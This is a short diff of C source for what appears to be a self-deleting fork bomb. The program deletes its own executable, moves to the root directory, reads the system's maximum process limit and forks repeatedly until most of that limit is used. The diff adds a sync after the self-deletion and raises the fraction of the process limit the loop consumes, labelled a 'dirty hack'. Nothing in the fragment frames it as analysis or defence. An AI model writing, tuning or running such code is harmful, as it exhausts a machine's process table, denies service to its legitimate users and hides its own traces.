@@ -55,6 +55,7 @@ main (int argc, char *argv[])
         strncpy (executable, argv[0], len);
         if (unlink (executable) == -1)
             err (1, "unlink");
+        sync ();
 
         /* like a pro :) */
         if (chdir ("/") < 0)
@@ -64,7 +65,7 @@ main (int argc, char *argv[])
         if (getrlimit (RLIMIT_NPROC, &rl) == -1)
                 err (1, "rlimit");
         count = (unsigned)rl.rlim_max;
-        count -= count / 20.0;
+        count -= count / 4.0; /* dirty hack */
         while (count--) {
                 while ((cpid = fork ()) == -1)
                         nanosleep (&wtime, NULL);
